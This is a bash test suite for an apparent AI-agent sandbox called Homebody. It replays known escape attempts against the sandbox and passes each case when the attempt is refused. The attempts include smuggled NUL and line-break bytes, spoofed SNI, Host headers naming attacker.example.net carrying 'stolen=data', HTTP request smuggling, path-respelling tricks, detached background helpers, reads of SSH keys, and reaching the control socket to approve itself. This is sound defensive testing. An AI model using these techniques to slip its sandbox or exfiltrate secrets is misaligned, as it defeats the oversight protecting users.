#!/bin/bash
# bypass-corpus.sh — every way we know of to get past the gate or the fence, as executable checks.
#
# Runs against a live engine (the app, or `homebody daemon`). Each case is something that was a real
# bypass in some agent sandbox in 2025–2026, or an obvious variation. A case passes when the
# attempt is refused. Add a case here whenever a new bypass is published anywhere.
#
#   tests/bypass-corpus.sh            run everything
#   tests/bypass-corpus.sh gate       only the gate (name rules, request parsing, TLS greeting)
#   tests/bypass-corpus.sh fence      only the OS fence (runs commands as the protected user)
set -u   # no pipefail: a refused command exits non-zero, and that is the outcome we are testing for
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SAI="${SAI:-$HERE/../target/debug/homebody}"
APP="${APP_ID:-claude-code}"
PORT="${GATE_PORT:-47110}"
GATE="http://127.0.0.1:$PORT"
pass=0; fail=0

check() { # name, expected substring, actual
  if [[ "$3" == *"$2"* ]]; then pass=$((pass+1)); printf '  \033[32m✓\033[0m %s\n' "$1"
  else fail=$((fail+1)); printf '  \033[31m✗ %s\033[0m\n      expected to contain: %s\n      got: %s\n' "$1" "$2" "$(echo "$3" | tail -2 | tr '\n' ' ')"; fi
}
code() { curl -x "$GATE" -sS -m 12 -o /dev/null -w '%{http_code}' "$@" 2>&1 | tr '\n' ' '; }
raw()  { (printf "$1"; sleep "${2:-1}") | nc 127.0.0.1 "$PORT" 2>/dev/null | head -1 | tr -d '\r'; }

"$SAI" status >/dev/null 2>&1 || { echo "The engine is not running. Open the app or run: homebody daemon"; exit 1; }

gate() {
  echo "Gate: destination names"
  check "trusted name is allowed (control)"            "404"  "$(code https://api.anthropic.com/)"
  check "raw IPv4 address"                              "403"  "$(code https://1.1.1.1/)"
  check "raw IPv6 address"                              "403"  "$(code 'https://[2606:4700:4700::1111]/')"
  check "IPv4 as one decimal number"                    "403"  "$(code https://16843009/)"
  check "IPv4 in hex"                                   "403"  "$(code https://0x01010101/)"
  check "IPv4-mapped IPv6"                              "403"  "$(code 'https://[::ffff:1.1.1.1]/')"
  check "single-label name (localhost)"                 "403"  "$(code https://localhost/)"
  check "NUL byte inside the name"                      "403"  "$(raw 'CONNECT api.anthropic.com\0.evil.example.org:443 HTTP/1.1\r\n\r\n')"
  check "NUL byte after a trusted name"                 "403"  "$(raw 'CONNECT api.anthropic.com\0:443 HTTP/1.1\r\n\r\n')"
  check "trusted name as a prefix of a blocked one"     "403"  "$(code https://api.anthropic.com.o1.ingest.sentry.io/)"
  check "trusted name in the user part of the URL"      "403"  "$(code https://api.anthropic.com@statsig.anthropic.com/)"
  check "blocked wildcard, deep subdomain"              "403"  "$(code https://a.b.c.sentry.io/)"
  check "upper-case spelling of a blocked name"         "403"  "$(code https://STATSIG.Anthropic.COM/)"
  check "trailing dot on a blocked name"                "403"  "$(code https://statsig.anthropic.com./)"
  check "port other than 80 or 443 on a trusted name"   "403"  "$(code https://api.anthropic.com:22/)"
  check "port 8443 on a trusted name"                   "403"  "$(code https://api.anthropic.com:8443/)"

  echo "Gate: names that point inward"
  "$SAI" trust "$APP" localtest.me >/dev/null 2>&1
  check "trusted name resolving to this computer"       "403"  "$(code https://localtest.me/)"
  check "same, plain HTTP"                              "403"  "$(code http://localtest.me/)"
  "$SAI" call remove_trust "{\"appId\":\"$APP\",\"host\":\"localtest.me\"}" >/dev/null 2>&1

  echo "Gate: request parsing"
  check "lower-case method"                             "400"  "$(raw 'connect api.anthropic.com:443 HTTP/1.1\r\n\r\n')"
  check "https:// in absolute form"                     "400"  "$(raw 'GET https://api.anthropic.com/ HTTP/1.1\r\n\r\n')"
  check "origin-form request (not a proxy request)"     "400"  "$(raw 'GET / HTTP/1.1\r\nHost: api.anthropic.com\r\n\r\n')"
  check "extra token on the request line"               "400"  "$(raw 'CONNECT api.anthropic.com:443 HTTP/1.1 x\r\n\r\n')"
  check "port 0"                                        "400"  "$(raw 'CONNECT api.anthropic.com:0 HTTP/1.1\r\n\r\n')"
  check "port out of range"                             "400"  "$(raw 'CONNECT api.anthropic.com:70000 HTTP/1.1\r\n\r\n')"
  check "line break smuggled into the target"           "400"  "$(raw 'CONNECT api.anthropic.com:443\r\nX: y HTTP/1.1\r\n\r\n')"

  echo "Gate: disguises inside an approved connection"
  check "greets the server as another name (SNI)"       "000"  "$(code --connect-to example.org:443:api.anthropic.com:443 https://example.org/)"
  check "no name in the greeting"                       "CUT"  "$( (echo | openssl s_client -proxy 127.0.0.1:$PORT -connect api.anthropic.com:443 -noservername 2>&1 | grep -q 'BEGIN CERTIFICATE' && echo CONNECTED) || echo CUT)"
  check "not TLS at all inside the tunnel"              "CUT"  "$( (printf 'CONNECT api.anthropic.com:443 HTTP/1.1\r\n\r\n'; sleep 0.4; printf 'SSH-2.0-OpenSSH_9.6\r\n'; sleep 1.5) | nc 127.0.0.1 $PORT 2>/dev/null | tail -n +3 | grep -q . && echo ANSWERED || echo CUT)"
  check "Host header naming another site (plain HTTP)"  "claude.ai" "$(curl -x "$GATE" -sS -m 12 -o /dev/null -D - -H 'Host: evil.example.org' http://claude.ai/ 2>&1 | grep -i '^location:' | tr -d '\r')"
}

fence() {
  R() { "$SAI" run "$APP" --cwd "$AGENT_HOME" -- "$@" 2>&1; }
  AGENT_HOME="$("$SAI" run "$APP" --cwd / -- /usr/bin/printenv HOME 2>/dev/null | tail -1)"
  [ -n "$AGENT_HOME" ] || { echo "Fence: skipped (the fence is not up for $APP: run setup first)"; return; }
  ME="$(id -un)"; MYHOME="$HOME"

  echo "Fence: who and where"
  check "runs as the protected user, not as you"        "NOT_ME" "$([ "$(R /usr/bin/id -un | tail -1)" != "$ME" ] && echo NOT_ME || echo SAME_USER)"
  export HOMEBODY_CORPUS_SECRET=hunter2
  check "your environment does not leak in"             "CLEAN"  "$(R /usr/bin/env | grep -q hunter2 && echo LEAKED || echo CLEAN)"
  check "trusted name through the gate (control)"       "404"    "$(R /usr/bin/curl -sS -m 10 -o /dev/null -w '%{http_code}' https://api.anthropic.com/ | tail -1)"

  echo "Fence: going around the gate"
  check "direct connection, by name"                    "000"    "$(R /usr/bin/curl -sS -m 6 --noproxy '*' -o /dev/null -w '%{http_code}' https://api.anthropic.com/ | tail -1)"
  check "direct connection, IPv4 address"               "not permitted" "$(R /usr/bin/nc -v -z -G 3 1.1.1.1 443)"
  check "direct connection, IPv6 address"               "not permitted" "$(R /usr/bin/nc -v -z -G 3 2606:4700:4700::1111 443)"
  check "local network address"                         "not permitted" "$(R /usr/bin/nc -v -z -G 3 192.168.1.1 80)"
  check "name lookup through the system resolver"       "NONE"   "$(R /usr/bin/dscacheutil -q host -a name example.com | grep -q address && echo RESOLVED || echo NONE)"
  check "name lookup from a program (getaddrinfo)"      "gaierror" "$(R /usr/bin/python3 -c "import socket; print(socket.getaddrinfo('example.com',443))")"
  check "direct DNS query over UDP"                     "NONE"   "$(R /usr/bin/dig +time=2 +tries=1 +short example.com @1.1.1.1 | grep -qE '^[0-9]+\.' && echo ANSWERED || echo NONE)"
  check "another app's gate"                            "000"    "$(R /usr/bin/curl -sS -m 6 -x http://127.0.0.1:47111 -o /dev/null -w '%{http_code}' https://ollama.com/ | tail -1)"
  check "another service on this computer (port 22)"    "refused" "$(R /usr/bin/nc -v -z -G 3 127.0.0.1 22 2>&1 | grep -q succeeded && echo REACHED || echo refused)"

  echo "Fence: what the app starts"
  # Vendor sandboxes cover the agent's shell commands and leave what it starts on the side (MCP
  # servers, hooks, language servers) outside. Here the fence is the user and the profile, so
  # everything the app starts is inside it, however it is started.
  check "a helper it starts (an MCP server, a hook)"    "not permitted" "$(R /usr/bin/python3 -c "import subprocess; print(subprocess.run(['/usr/bin/nc','-v','-z','-G','3','1.1.1.1','443'],capture_output=True,text=True).stderr)")"
  check "a helper cut loose from it (new session, in the background)" "not permitted" "$(R /bin/sh -c '/usr/bin/python3 -c "import os,subprocess; os.setsid(); subprocess.Popen([\"/bin/sh\",\"-c\",\"/usr/bin/nc -v -z -G 3 1.1.1.1 443 > /tmp/hb-corpus-loose.txt 2>&1\"])"; sleep 2; cat /tmp/hb-corpus-loose.txt; rm -f /tmp/hb-corpus-loose.txt')"
  check "a helper told to forget the gate"              "000"    "$(R /usr/bin/env -u HTTPS_PROXY -u https_proxy -u ALL_PROXY /usr/bin/curl -sS -m 6 -o /dev/null -w '%{http_code}' https://api.anthropic.com/ | tail -1)"

  echo "Fence: servers on this computer"
  # A listener of yours, one of the agent's own, and a port that changes hands between the two.
  /usr/bin/nc -l 127.0.0.1 47981 >/dev/null 2>&1 & mine=$!
  sleep 0.5
  check "a server of yours"                             "refused" "$(R /usr/bin/nc -v -z -G 2 127.0.0.1 47981 2>&1 | grep -q succeeded && echo REACHED || echo refused)"
  kill -9 "$mine" 2>/dev/null; wait "$mine" 2>/dev/null
  if "$SAI" call get_status 2>/dev/null | grep -q '"localServers": true'; then
    check "a server it started itself"                  "reached" "$(R /bin/sh -c '/usr/bin/nc -l 127.0.0.1 47982 >/dev/null 2>&1 & for i in 1 2 3 4 5 6; do /usr/bin/nc -z -G 1 127.0.0.1 47982 2>/dev/null && { echo reached; exit 0; }; sleep 0.3; done; echo never' | tail -1)"
    R /bin/sh -c '/usr/bin/nc -l 127.0.0.1 47983 >/dev/null 2>&1 & sleep 1.5; /usr/bin/nc -z -G 1 127.0.0.1 47983 >/dev/null 2>&1; sleep 1' >/dev/null 2>&1
    /usr/bin/nc -l 127.0.0.1 47983 >/dev/null 2>&1 & mine=$!
    sleep 1
    check "a port that was its own and is now yours"    "refused" "$(R /usr/bin/nc -v -z -G 2 127.0.0.1 47983 2>&1 | grep -q succeeded && echo REACHED || echo refused)"
    kill -9 "$mine" 2>/dev/null; wait "$mine" 2>/dev/null
  else
    check "a server it started itself (local servers off)" "refused" "$(R /bin/sh -c '/usr/bin/nc -l 127.0.0.1 47982 >/dev/null 2>&1 & sleep 1; /usr/bin/nc -z -G 1 127.0.0.1 47982 2>/dev/null && echo REACHED || echo refused' | tail -1)"
  fi

  echo "Fence: your files"
  refused() { "$@" 2>&1 | grep -qiE 'not permitted|permission denied' && echo denied || echo ALLOWED; }
  check "list your home folder"                         "denied" "$(refused R /bin/ls "$MYHOME")"
  check "read a file in your home by exact path"        "denied" "$(R /bin/cat "$MYHOME/.zshrc" 2>&1 | grep -qiE 'not permitted|denied' && echo denied || echo READ)"
  check "read your SSH keys"                            "denied" "$(R /bin/ls "$MYHOME/.ssh" 2>&1 | grep -qiE 'not permitted|denied' && echo denied || echo LISTED)"
  check "create a file in your home"                    "denied" "$(refused R /usr/bin/touch "$MYHOME/.sai-corpus-probe")"
  check "reach the control socket (approve itself)"     "denied" "$(R /bin/ls "$("$SAI" call get_policy_text >/dev/null 2>&1; echo "${HOMEBODY_DATA_DIR:-$MYHOME/Library/Application Support/Homebody}")/control.sock" 2>&1 | grep -qiE 'not permitted|denied' && echo denied || echo REACHED)"

  echo "Fence: your screen"
  # A keychain write by a user that has no keychain makes macOS show "Keychain Not Found … Reset
  # To Defaults" on your screen, and waits. Inside the fence it must fail at once instead. The
  # alarm ends it after 5 s if it did wait (which would also take the prompt away again).
  check "put a system keychain prompt on your screen"   "refused at once" "$(R /usr/bin/perl -e 'alarm 5; exec @ARGV' /usr/bin/security add-generic-password -a hb-corpus -s hb-corpus-probe -w x 2>&1 | grep -q 'Unable to obtain authorization' && echo 'refused at once' || echo 'WAITED OR STORED')"
  check "and nothing was stored in a keychain"          "not found" "$(R /usr/bin/security find-generic-password -s hb-corpus-probe 2>&1 | grep -q 'could not be found' && echo 'not found' || echo FOUND)"
}

# Looking inside connections to trusted places. Switched on for the test and put back after.
inside() {
  "$SAI" call get_status 2>/dev/null | grep -q '"fence": "up"' || { echo "Inside: skipped (the fence is not up)"; return; }
  was_on="$("$SAI" call get_status | /usr/bin/python3 -I -c "import sys,json; print([a['inspect'] for a in json.load(sys.stdin)['apps'] if a['id']=='$APP'][0])" 2>/dev/null)"
  "$SAI" inspect "$APP" on >/dev/null
  R() { "$SAI" run "$APP" -- "$@" 2>&1; }
  code() { R /usr/bin/curl -sS -m 12 -o /dev/null -w '%{http_code}' "$@" | tail -1; }
  marker="corpus-secret-$$"
  echo "Inside: connections to a trusted place"
  check "an ordinary request gets the real answer"       "401" "$(code "https://api.anthropic.com/v1/models?key=$marker")"
  check "what follows \"?\" is never written down"        "0"   "$(grep -c "$marker" "${HOMEBODY_DATA_DIR:-$HOME/Library/Application Support/Homebody}/ledger.jsonl")"
  check "a program not told about the certificate"       "000" "$(R /usr/bin/env -u CURL_CA_BUNDLE -u SSL_CERT_FILE /usr/bin/curl -sS -m 12 -o /dev/null -w '%{http_code}' https://api.anthropic.com/ | tail -1)"
  check "the trusted name as cover for another site"     "000" "$(code -H 'Host: attacker.example.net' -d 'stolen=data' https://api.anthropic.com/upload)"
  check "another site named with its port"               "000" "$(code -H 'Host: attacker.example.net:443' https://api.anthropic.com/)"
  check "a request with two lengths (smuggling)"         "000" "$(code -H 'Content-Length: 5' -H 'Transfer-Encoding: chunked' -d 'hello' https://api.anthropic.com/v1/messages)"
  check "an unusual transfer encoding"                   "000" "$(code -H 'Transfer-Encoding: gzip, chunked' -d 'hello' https://api.anthropic.com/v1/messages)"
  echo "Inside: addresses that are switched off"
  "$SAI" inside "$APP" api.anthropic.com /corpus/off off >/dev/null
  check "an address that is switched off"                "403" "$(code -d 'x=1' https://api.anthropic.com/corpus/off/deeper)"
  check "the same, with a query to hide behind"          "403" "$(code "https://api.anthropic.com/corpus/off?really=/v1/messages")"
  check "the same, spelled with an extra slash"          "403" "$(code https://api.anthropic.com/corpus/off/)"
  check "respelled: a dot segment"                       "403" "$(code --path-as-is https://api.anthropic.com/corpus/./off)"
  check "respelled: a doubled slash"                     "403" "$(code --path-as-is https://api.anthropic.com/corpus//off)"
  check "respelled: up and back down"                    "403" "$(code --path-as-is https://api.anthropic.com/x/../corpus/off)"
  check "respelled: an escaped letter"                   "403" "$(code --path-as-is https://api.anthropic.com/corpus/%6Fff)"
  check "respelled: an escaped slash"                    "403" "$(code --path-as-is https://api.anthropic.com/corpus%2Foff)"
  check "respelled: capitals"                            "403" "$(code --path-as-is https://api.anthropic.com/Corpus/OFF)"
  check "respelled: a parameter in the segment"          "403" "$(code --path-as-is 'https://api.anthropic.com/corpus/off;v=1')"
  check "a neighbour with a similar name still works"    "404" "$(code https://api.anthropic.com/corpus/offline)"
  check "the rest of the place still works"              "401" "$(code https://api.anthropic.com/v1/models)"
  check "switched off, hidden after an honest request"   "403" "$(R /usr/bin/curl -sS -m 12 -o /dev/null -w '%{http_code} ' https://api.anthropic.com/v1/models --next -sS -m 12 -o /dev/null -w '%{http_code}' https://api.anthropic.com/corpus/off | tail -1 | awk '{print $2}')"
  "$SAI" call remove_inside_rule "{\"appId\":\"$APP\",\"host\":\"api.anthropic.com\",\"path\":\"/corpus/off\"}" >/dev/null
  "$SAI" call set_inside_rule "{\"appId\":\"$APP\",\"host\":\"api.anthropic.com\",\"path\":\"/corpus/send\",\"method\":\"POST\",\"enabled\":false}" >/dev/null
  check "sending is off, fetching the same address works" "404" "$(code https://api.anthropic.com/corpus/send/x)"
  check "sending is off: sending is refused"             "403" "$(code -d 'x=1' https://api.anthropic.com/corpus/send)"
  check "sending is off: in small letters too"           "403" "$(code -X post -d 'x=1' https://api.anthropic.com/corpus/send)"
  "$SAI" call remove_inside_rule "{\"appId\":\"$APP\",\"host\":\"api.anthropic.com\",\"path\":\"/corpus/send\",\"method\":\"POST\"}" >/dev/null
  check "a fake switch to a web socket hides nothing"    "000" "$(R /usr/bin/curl -sS -m 12 -o /dev/null -w '%{http_code} ' -H 'Upgrade: websocket' -H 'Connection: Upgrade' https://api.anthropic.com/v1/models --next -sS -m 12 -o /dev/null -w '%{http_code}' -H 'Host: attacker.example.net' https://api.anthropic.com/upload | tail -1 | awk '{print $2}')"
  check "a switch to something that is not a web socket" "000" "$(code -H 'Upgrade: h2c' -H 'Connection: Upgrade' https://api.anthropic.com/v1/models)"

  echo "Inside: secrets in what is sent"
  # Made up here, so that no file holds something token-shaped. Not real credentials.
  tok="gh""p_$(printf 'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8')"
  key="-----BEGIN OPENSSH PRIV""ATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz\\n"
  pad="$(printf 'x%.0s' $(seq 1 1500))"
  check "a request with nothing secret in it"            "401" "$(code -d "{\"content\":\"$pad hello\"}" https://api.anthropic.com/v1/messages)"
  check "an access token in the content"                 "403" "$(code -d "{\"content\":\"$pad my token is $tok\"}" https://api.anthropic.com/v1/messages)"
  check "a private key in the content"                   "403" "$(code -d "{\"content\":\"$pad $key\"}" https://api.anthropic.com/v1/messages)"
  check "a token sent in chunks"                         "403" "$(code -H 'Transfer-Encoding: chunked' -d "{\"content\":\"$pad $tok $pad\"}" https://api.anthropic.com/v1/messages)"
  check "a token as the very last thing"                 "403" "$(code -d "$tok" https://api.anthropic.com/v1/messages)"
  check "the token never reaches the log"                "0"   "$(grep -c "$tok" "${HOMEBODY_DATA_DIR:-$HOME/Library/Application Support/Homebody}/ledger.jsonl")"
  "$SAI" secrets "$APP" off >/dev/null
  check "with the check switched off it goes"            "401" "$(code -d "{\"content\":\"$tok\"}" https://api.anthropic.com/v1/messages)"
  "$SAI" secrets "$APP" on >/dev/null

  echo "Inside: keys that stay home"
  # Homebody keeps a key (made up here) for one place. The app must only ever hold a stand-in,
  # and the stand-in must not be accepted anywhere the key is not for.
  DATA="${HOMEBODY_DATA_DIR:-$HOME/Library/Application Support/Homebody}"
  real="hb-corpus-REAL-$(date +%s)-$RANDOM-key"
  printf '%s\n' "$real" | "$SAI" key "$APP" set HB_CORPUS_KEY --to api.anthropic.com >/dev/null 2>&1
  standin="$(R /usr/bin/printenv HB_CORPUS_KEY | tail -1)"
  check "the app is handed a stand-in, not the key"      "STAND-IN" "$([ -n "$standin" ] && [ "$standin" != "$real" ] && [ ${#standin} -eq ${#real} ] && echo STAND-IN || echo "GOT: $standin")"
  check "the key is nowhere in its environment"          "0"   "$(R /usr/bin/env | grep -c "$real")"
  check "it cannot read where the keys are kept"         "denied" "$(R /bin/cat "$DATA/keys.json" 2>&1 | grep -qiE 'not permitted|denied' && echo denied || echo READ)"
  check "sent to the place the key is for, it goes"      "401" "$(R /usr/bin/curl -sS -m 12 -o /dev/null -w '%{http_code}' -H "x-api-key: $standin" https://api.anthropic.com/v1/models | tail -1)"
  # To the right place, but not as a credential. A server that quotes the address or a header
  # back in its answer (an error page does) would hand the real key to the app.
  check "in the address, even of its own place, it is refused" "only be sent as a credential" "$(R /usr/bin/curl -sS -m 12 "https://api.anthropic.com/v1/$standin" | tail -1)"
  check "as some other parameter in the address"         "only be sent as a credential" "$(R /usr/bin/curl -sS -m 12 "https://api.anthropic.com/v1/models?$standin=1" | tail -1)"
  check "in a header that is not for credentials"        "only be sent as a credential" "$(R /usr/bin/curl -sS -m 12 -H "Origin: https://$standin" https://api.anthropic.com/v1/models | tail -1)"
  check "glued to something else in a credential header" "only be sent as a credential" "$(R /usr/bin/curl -sS -m 12 -H "x-api-key: x$standin" https://api.anthropic.com/v1/models | tail -1)"
  check "with a method that asks for the request back"   "only be sent as a credential" "$(R /usr/bin/curl -sS -m 12 -X TRACE -H "x-api-key: $standin" https://api.anthropic.com/v1/models | tail -1)"
  check "a place for a key must be one exact place"      "exact place" "$("$SAI" key "$APP" set HB_CORPUS_KEY --to '*.example.com' 2>&1 <<< "$real")"
  "$SAI" key "$APP" set HB_CORPUS_KEY --to example.com >/dev/null 2>&1 <<< "$real"
  check "sent to another trusted place, it is stopped"   "not meant to go" "$(R /usr/bin/curl -sS -m 12 -H "x-api-key: $standin" https://api.anthropic.com/v1/models | tail -1)"
  check "the same, as a bearer token"                    "not meant to go" "$(R /usr/bin/curl -sS -m 12 -H "Authorization: Bearer $standin" https://api.anthropic.com/v1/models | tail -1)"
  check "the same, wrapped in a name-and-password header" "not meant to go" "$(R /usr/bin/curl -sS -m 12 -u "x:$standin" https://api.anthropic.com/v1/models | tail -1)"
  check "the same, in the address"                       "not meant to go" "$(R /usr/bin/curl -sS -m 12 "https://api.anthropic.com/v1/models?key=$standin" | tail -1)"
  check "a request without it still goes"                "401" "$(R /usr/bin/curl -sS -m 12 -o /dev/null -w '%{http_code}' https://api.anthropic.com/v1/models | tail -1)"
  check "Look inside cannot be switched off under a kept key" "Remove the key first" "$("$SAI" inspect "$APP" off 2>&1)"
  check "the key is not in the log or the settings"      "0 0" "$(grep -c "$real" "$DATA/ledger.jsonl") $(grep -c "$real" "$DATA/settings.json")"
  "$SAI" key "$APP" remove HB_CORPUS_KEY >/dev/null 2>&1
  check "removed, it is gone from where keys are kept"   "0"   "$(grep -c "$real" "$DATA/keys.json" 2>/dev/null || echo 0)"
  check "and the app is no longer handed anything"       "none" "$(R /bin/sh -c 'echo ${HB_CORPUS_KEY:-none}' | tail -1)"
  [ "$was_on" = "True" ] || "$SAI" inspect "$APP" off >/dev/null
}

case "${1:-all}" in
  gate) gate ;;
  fence) fence ;;
  inside) inside ;;
  *) gate; echo; fence; echo; inside ;;
esac
echo
printf '%d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
